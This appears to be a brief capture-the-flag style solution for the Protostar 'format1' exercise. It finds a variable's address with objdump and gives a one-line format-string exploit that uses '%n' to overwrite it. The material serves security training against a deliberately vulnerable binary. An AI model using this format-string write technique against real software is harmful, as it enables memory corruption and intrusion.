## protostar-format1

## http://exploit-exercises.com/protostar/format1

```sh

$ objdump -t format1 | grep target
08049638 g       0 .bss    00000004            target
./format1 $(python -c 'print "\x38\x96\x04\x08"')'..%128$n'

```